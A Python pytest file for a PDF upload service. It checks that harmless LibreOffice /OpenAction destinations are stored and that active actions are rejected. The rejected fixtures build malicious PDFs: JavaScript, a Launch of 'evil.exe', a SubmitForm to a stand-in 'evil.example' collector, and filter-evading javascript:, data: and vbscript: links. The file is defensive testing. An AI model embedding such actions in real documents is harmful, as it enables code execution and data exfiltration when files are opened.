"""OpenAction is a normal initial view, not an exploit by itself.

LibreOffice writes /OpenAction as a destination array. A GoTo action is the
same idea. JavaScript, Launch, SubmitForm, and scriptable URI schemes are
refused, including when they sit behind an indirect reference or /Next.
"""

import io
import shutil
import subprocess
import tempfile
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from pypdf import PdfReader, PdfWriter
from pypdf.actions import JavaScript
from pypdf.generic import ArrayObject, DictionaryObject, NameObject, NumberObject, TextStringObject

from tests.test_upload_structure import _assert_kept, _assert_rejected

FIXTURES = Path(__file__).parent / "fixtures" / "libreoffice"
_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Fatura</title></head>
<body><h1>Fatura FT A/12</h1><p>Café Lisboa</p><p>Total: 12,30 EUR</p></body>
</html>
"""


def _writer() -> tuple[PdfWriter, object]:
    writer = PdfWriter()
    writer.add_blank_page(width=200, height=200)
    return writer, writer.pages[0]


def _save(writer: PdfWriter) -> bytes:
    buffer = io.BytesIO()
    writer.write(buffer)
    return buffer.getvalue()


def _destination(page, kind: str = "/Fit") -> ArrayObject:
    return ArrayObject([page.indirect_reference, NameObject(kind)])


def _goto(page, nxt=None) -> DictionaryObject:
    action = DictionaryObject()
    action[NameObject("/S")] = NameObject("/GoTo")
    action[NameObject("/D")] = _destination(page)
    if nxt is not None:
        action[NameObject("/Next")] = nxt
    return action


def _uri(value: str) -> DictionaryObject:
    action = DictionaryObject()
    action[NameObject("/S")] = NameObject("/URI")
    action[NameObject("/URI")] = TextStringObject(value)
    return action


def _link(page, action) -> None:
    annotation = DictionaryObject()
    annotation[NameObject("/Type")] = NameObject("/Annot")
    annotation[NameObject("/Subtype")] = NameObject("/Link")
    annotation[NameObject("/Rect")] = ArrayObject(
        [NumberObject(0), NumberObject(0), NumberObject(10), NumberObject(10)]
    )
    annotation[NameObject("/A")] = action
    page[NameObject("/Annots")] = ArrayObject([annotation])


def _open_fit() -> bytes:
    writer, page = _writer()
    writer._root_object[NameObject("/OpenAction")] = _destination(page)
    return _save(writer)


def _open_goto() -> bytes:
    writer, page = _writer()
    writer._root_object[NameObject("/OpenAction")] = _goto(page)
    return _save(writer)


def _open_indirect_fit() -> bytes:
    writer, page = _writer()
    writer._root_object[NameObject("/OpenAction")] = writer._add_object(_destination(page))
    return _save(writer)


def _https_link() -> bytes:
    writer, page = _writer()
    _link(page, _uri("https://example.com/fatura"))
    return _save(writer)


def _goto_next_javascript() -> bytes:
    writer, page = _writer()
    writer._root_object[NameObject("/OpenAction")] = _goto(page, JavaScript("app.alert(1)"))
    return _save(writer)


def _goto_next_array_with_script_uri() -> bytes:
    writer, page = _writer()
    chain = ArrayObject([_uri("https://example.com/ok"), _uri("javascript:alert(1)")])
    writer._root_object[NameObject("/OpenAction")] = _goto(page, chain)
    return _save(writer)


def _indirect_javascript() -> bytes:
    writer, _page = _writer()
    writer._root_object[NameObject("/OpenAction")] = writer._add_object(JavaScript("app.alert(1)"))
    return _save(writer)


def _launch() -> bytes:
    writer, _page = _writer()
    action = DictionaryObject()
    action[NameObject("/S")] = NameObject("/Launch")
    action[NameObject("/F")] = TextStringObject("evil.exe")
    writer._root_object[NameObject("/OpenAction")] = action
    return _save(writer)


def _submit_form() -> bytes:
    writer, _page = _writer()
    action = DictionaryObject()
    action[NameObject("/S")] = NameObject("/SubmitForm")
    action[NameObject("/F")] = TextStringObject("https://evil.example/collect")
    writer._root_object[NameObject("/OpenAction")] = action
    return _save(writer)


def _uri_link(payload: str) -> bytes:
    writer, page = _writer()
    _link(page, _uri(payload))
    return _save(writer)


SAFE = [
    ("open_fit", _open_fit),
    ("open_goto", _open_goto),
    ("open_indirect_fit", _open_indirect_fit),
    ("https_link", _https_link),
]

REJECTED = [
    ("goto_next_javascript", _goto_next_javascript),
    ("goto_next_array_script_uri", _goto_next_array_with_script_uri),
    ("indirect_javascript", _indirect_javascript),
    ("launch", _launch),
    ("submit_form", _submit_form),
    ("uri_javascript", lambda: _uri_link("javascript:alert(1)")),
    ("uri_javascript_padded", lambda: _uri_link(" \n\x00javascript:alert(1)")),
    ("uri_data", lambda: _uri_link("DATA:text/html,x")),
    ("uri_vbscript", lambda: _uri_link("\x7fvbscript:msg")),
]


@pytest.mark.parametrize("name", sorted(path.name for path in FIXTURES.glob("*.pdf")))
def test_libreoffice_invoice_is_stored(client: TestClient, name: str):
    content = (FIXTURES / name).read_bytes()
    reader = PdfReader(io.BytesIO(content))
    assert "LibreOffice" in (reader.metadata.producer or "")
    assert reader.trailer["/Root"].get_object().get("/OpenAction") is not None
    _assert_kept(client, name.replace(".", "-"), content, "application/pdf")


@pytest.mark.parametrize("name,build", SAFE, ids=[item[0] for item in SAFE])
def test_view_destinations_are_stored(client: TestClient, name: str, build):
    _assert_kept(client, name, build(), "application/pdf")


@pytest.mark.parametrize("name,build", REJECTED, ids=[item[0] for item in REJECTED])
def test_active_actions_are_rejected(client: TestClient, name: str, build):
    _assert_rejected(client, name, build(), "application/pdf")


def test_fresh_libreoffice_export_is_stored(client: TestClient):
    soffice = shutil.which("soffice")
    if soffice is None:
        pytest.skip("soffice is not installed")
    with tempfile.TemporaryDirectory() as directory:
        source = Path(directory) / "fatura.html"
        source.write_text(_HTML, encoding="utf-8")
        subprocess.run(
            [soffice, "--headless", "--norestore", "--convert-to", "pdf", "--outdir", directory, str(source)],
            check=True,
            capture_output=True,
            timeout=60,
        )
        content = (Path(directory) / "fatura.pdf").read_bytes()
    assert b"/OpenAction" in content
    _assert_kept(client, "soffice-live", content, "application/pdf")


def test_qpdf_transform_of_a_libreoffice_invoice_is_stored(client: TestClient):
    qpdf = shutil.which("qpdf")
    if qpdf is None:
        pytest.skip("qpdf is not installed")
    original = FIXTURES / "fatura-cafe-lisboa.pdf"
    with tempfile.TemporaryDirectory() as directory:
        transformed = Path(directory) / "out.pdf"
        subprocess.run(
            [qpdf, "--object-streams=generate", "--linearize", str(original), str(transformed)],
            check=True,
            capture_output=True,
            timeout=30,
        )
        content = transformed.read_bytes()
    assert b"/OpenAction" in content
    _assert_kept(client, "qpdf-live", content, "application/pdf")
